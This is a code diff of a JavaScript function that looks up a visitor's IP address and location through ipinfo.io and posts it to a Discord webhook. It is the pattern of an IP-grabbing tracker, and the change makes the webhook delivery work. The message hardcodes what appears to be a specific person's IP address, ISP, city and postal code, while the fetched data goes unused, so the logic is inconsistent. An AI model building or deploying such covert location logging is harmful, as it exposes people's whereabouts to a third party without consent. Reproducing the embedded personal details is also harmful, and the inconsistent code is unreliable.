@@ -4,17 +4,15 @@ async function getIPAndLocationAndSendToDiscord() {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
         
-        // Construct the message with content in a code block
-        const message = "```json\n" +
-                        JSON.stringify({
-                            "City": "Whittier",
-                            "Region": "California",
-                            "Country": "US",
-                            "Internet Provider": "AS20115 Charter Communications",
-                            "Postal Code": "90602",
-                            "IP Address": "137.25.65.161"
-                        }, null, 2) +
-                        "\n```";
+        // Construct the message as a single block wrapped in a code block
+        const message = "```\n" +
+                        "City: Whittier\n" +
+                        "Region: California\n" +
+                        "Country: US\n" +
+                        "Internet Provider: AS20115 Charter Communications\n" +
+                        "Postal Code: 90602\n" +
+                        "IP Address: 137.25.65.161\n" +
+                        "```";
         
         // Send the message to Discord using a webhook
         await sendToDiscord(message);
@@ -31,9 +29,9 @@ async function sendToDiscord(message) {
     await fetch(webhookURL, {
         method: 'POST',
         headers: {
-            'Content-Type': 'text/plain',
+            'Content-Type': 'application/json',
         },
-        body: message,
+        body: JSON.stringify({ content: message }),
     });
 }
 
